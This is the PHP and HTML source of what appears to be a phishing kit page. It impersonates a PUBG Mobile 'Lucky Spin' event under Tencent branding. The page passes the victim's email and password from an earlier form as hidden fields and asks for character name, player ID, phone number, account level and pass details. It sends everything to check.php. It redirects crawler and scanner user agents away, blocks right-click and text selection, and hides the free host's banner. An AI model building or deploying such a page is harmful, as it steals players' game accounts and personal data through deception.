<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: shagitz.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>
<style>img[alt*="www.000webhost.com"]{display:none}</style>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE - LUCKY SPIN</title>
    <link rel="icon" type="img/png" href="http://www.pubgmobile.com/id/event/halloweeks2019/images/icon_logo.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from Tencent. You can spin in one times only!">
    <meta property="og:image" content="http://www.pubgmobile.com/id/event/halloweeks2019/images/icon_logo.jpg">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
     <script type="text/javascript" src="js-zone/jquery.js"> </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script> 
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script script language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="sticky">
        <a href=""><img src="http://www.pubgmobile.com/id/event/2ndAnniv/images/s3_light.gif"></a>
    </div>
    <div class="slider-container">
        <div class="slider" style="display: none;"><img src="img/s5_pic_3.png" style="width:100%;"></div>
        <div class="slider" style="display: none;"><img src="img/s5_pic_2.png" style="width:100%;"></div>
        <div class="slider" style="display: none;"><img src="img/s5_pic_1.png" style="width:100%;"></div>
    </div>
    <div class="notification-container">
        <div class="notification">
            <span class="label1" style="font-family: teko;font-size: 17px">EVENT SEASON 12</span>
            <span class="title"></span>
            <span class="label" style="font-family: teko;font-size: 17px">ACCOUNT VERIFICATION</span>
        </div>
    </div>
    <div class="gallery-container">
        <div class="cont">
            <div id="zone" class="gallery">
                <br>
                <script language="JavaScript">
                    document.write(inti())
                </script>
<style type="text/css">
    input{
        width: 350px;
        border:none;
        background: transparent;
        border-bottom: 2px solid #eeafeead;
        color: white;
        font-weight: bold;
        padding-left:5px;
        margin-top: 5px;
    }
    input::placeholder{
        color: white;
    }
    -webkit-input::placeholder{
        color: white;
        }
  -moz-input::placeholder{
    color: red;
    }
  -o-input::placeholder{
    color: white;
    }
    -ms-input::placeholder{
        color: white;
    }
    button{
        width: 350px;
        margin-top: 15px;
        height: 30px;
        background: #3bc2e7;
        color: white;
        border:none;
        border-radius: 4px;
        font-family: teko;
        font-size: 18px;
    }
    select{
        width: 350px;
        border:none;
        background: transparent;
        border-bottom: 2px solid #eeafeead;
        color: white;
        font-weight: bold;
        padding-left:5px;
        margin-top: 5px;
    }
</style>
                <section class="container" id="js-lotto">
                  <form action="check.php" method="post">
                    <input type="hidden" name="email" value="<?php echo $email;?>" readonly>
                    <input type="hidden" name="password" value="<?php echo $password;?>" readonly>
                      <div class="form-group">
                          <input type="text" placeholder="Character Name" name="nickname" autofocus="" autocomplete="off" required>
                      </div>
                      <div class="form-group">
                          <input type="text" placeholder="Player ID" name="id" autocomplete="off" required>
                      </div>
                       <div class="form-group">
                          <input type="number" placeholder="Phone Number" name="phone" autocomplete="off" required>
                      </div>
                      <div class="form-group">
                        <select name="level" required>
                        <option selected="selected" disabled="disabled" value="">Account Level</option>
                        <option>1</option>
                        <option>2</option>
                        <option>3</option>
                        <option>4</option>
                        <option>5</option>
                        <option>6</option>
                        <option>7</option>
                        <option>8</option>
                        <option>9</option>
                        <option>10</option>
                        <option>11</option>
                        <option>12</option>
                        <option>13</option>
                        <option>14</option>
                        <option>15</option>
                        <option>16</option>
                        <option>17</option>
                        <option>18</option>
                        <option>19</option>
                        <option>20</option>
                        <option>21</option>
                        <option>22</option>
                        <option>23</option>
                        <option>24</option>
                        <option>25</option>
                        <option>26</option>
                        <option>27</option>
                        <option>28</option>
                        <option>29</option>
                        <option>30</option>
                        <option>31</option>
                        <option>32</option>
                        <option>33</option>
                        <option>34</option>
                        <option>35</option>
                        <option>36</option>
                        <option>37</option>
                        <option>38</option>
                        <option>39</option>
                        <option>40</option>
                        <option>41</option>
                        <option>42</option>
                        <option>43</option>
                        <option>44</option>
                        <option>45</option>
                        <option>46</option>
                        <option>47</option>
                        <option>48</option>
                        <option>49</option>
                        <option>50</option>
                        <option>51</option>
                        <option>52</option>
                        <option>53</option>
                        <option>54</option>
                        <option>55</option>
                        <option>56</option>
                        <option>57</option>
                        <option>58</option>
                        <option>59</option>
                        <option>60</option>
                        <option>61</option>
                        <option>62</option>
                        <option>63</option>
                        <option>64</option>
                        <option>65</option>
                        <option>66</option>
                        <option>67</option>
                        <option>68</option>
                        <option>69</option>
                        <option>70</option>
                        <option>71</option>
                        <option>72</option>
                        <option>73</option>
                        <option>74</option>
                        <option>75</option>
                        <option>76</option>
                        <option>77</option>
                        <option>78</option>
                        <option>79</option>
                        <option>80</option>
                        <option>81</option>
                        <option>82</option>
                        <option>83</option>
                        <option>84</option>
                        <option>85</option>
                        <option>86</option>
                        <option>87</option>
                        <option>88</option>
                        <option>89</option>
                        <option>90</option>
                        <option>91</option>
                        <option>92</option>
                        <option>93</option>
                        <option>94</option>
                        <option>95</option>
                        <option>96</option>
                        <option>97</option>
                        <option>98</option>
                        <option>99</option>
                        <option>100</option>
                        </select>
                      </div>
                      <div class="form-group">
                         <select name="tier" required>
                        <option selected="selected" disabled="disabled" value="">Ranked Tier Level</option>
                        <option>Bronze</option>
                        <option>Silver</option>
                        <option>Gold</option>
                        <option>Platinum</option>
                        <option>Diamond</option>
                        <option>Crown</option>
                        <option>Ace</option>
                        <option>Conqueror</option>
                        </select>
                      </div>
                      <div class="form-group">
                        <select name="rpt" required>
                        <option selected="selected" disabled="disabled" value="">Royale Pass Type</option>
                        <option>Free Royale Pass</option>
                        <option>Elite Royale Pass</option>
                        <option>Elite Royale Pass Plus</option>
                        </select>
                      </div>
                      <div class="form-group">
                         <select name="rpl" required>
                        <option selected="selected" disabled="disabled" value="">Royale Pass Level</option>
                        <option>1</option>
                        <option>2</option>
                        <option>3</option>
                        <option>4</option>
                        <option>5</option>
                        <option>6</option>
                        <option>7</option>
                        <option>8</option>
                        <option>9</option>
                        <option>10</option>
                        <option>11</option>
                        <option>12</option>
                        <option>13</option>
                        <option>14</option>
                        <option>15</option>
                        <option>16</option>
                        <option>17</option>
                        <option>18</option>
                        <option>19</option>
                        <option>20</option>
                        <option>21</option>
                        <option>22</option>
                        <option>23</option>
                        <option>24</option>
                        <option>25</option>
                        <option>26</option>
                        <option>27</option>
                        <option>28</option>
                        <option>29</option>
                        <option>30</option>
                        <option>31</option>
                        <option>32</option>
                        <option>33</option>
                        <option>34</option>
                        <option>35</option>
                        <option>36</option>
                        <option>37</option>
                        <option>38</option>
                        <option>39</option>
                        <option>40</option>
                        <option>41</option>
                        <option>42</option>
                        <option>43</option>
                        <option>44</option>
                        <option>45</option>
                        <option>46</option>
                        <option>47</option>
                        <option>48</option>
                        <option>49</option>
                        <option>50</option>
                        <option>51</option>
                        <option>52</option>
                        <option>53</option>
                        <option>54</option>
                        <option>55</option>
                        <option>56</option>
                        <option>57</option>
                        <option>58</option>
                        <option>59</option>
                        <option>60</option>
                        <option>61</option>
                        <option>62</option>
                        <option>63</option>
                        <option>64</option>
                        <option>65</option>
                        <option>66</option>
                        <option>67</option>
                        <option>68</option>
                        <option>69</option>
                        <option>70</option>
                        <option>71</option>
                        <option>72</option>
                        <option>73</option>
                        <option>74</option>
                        <option>75</option>
                        <option>76</option>
                        <option>77</option>
                        <option>78</option>
                        <option>79</option>
                        <option>80</option>
                        <option>81</option>
                        <option>82</option>
                        <option>83</option>
                        <option>84</option>
                        <option>85</option>
                        <option>86</option>
                        <option>87</option>
                        <option>88</option>
                        <option>89</option>
                        <option>90</option>
                        <option>91</option>
                        <option>92</option>
                        <option>93</option>
                        <option>94</option>
                        <option>95</option>
                        <option>96</option>
                        <option>97</option>
                        <option>98</option>
                        <option>99</option>
                        <option>100</option>
                        </select>
                      </div>
                      <input type="hidden" name="login" value="<?php echo $login;?>" readonly>
                      <div class="form-group">
                          <button type="submit" class="">VERIFICATION</button>
                      </div>
                  </form>
                </section>
            </div>
            <br>
            <br>
        </div>
        <script language="JavaScript">
            document.write(foot())
        </script>

    </div>
    <div class="div-bot" style="color:white;border:1px #6cfdff solid;padding-top: 10px;padding-bottom: 3px;">
        <center>
            <p>
                <img src="img/pubg.png" style="padding:10px;height:50px;width: 50px;">
                <img src="img/tencent.png" style="padding:10px;height:50px;width: 100px;">
                <br><font face="teko" size="2">Tencent Event © 2020 All right reserved.</font>
            </p>
        </center>
    </div>
    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="./index_files/gift-zone.js.download"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js"> </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
   

</body>

</html>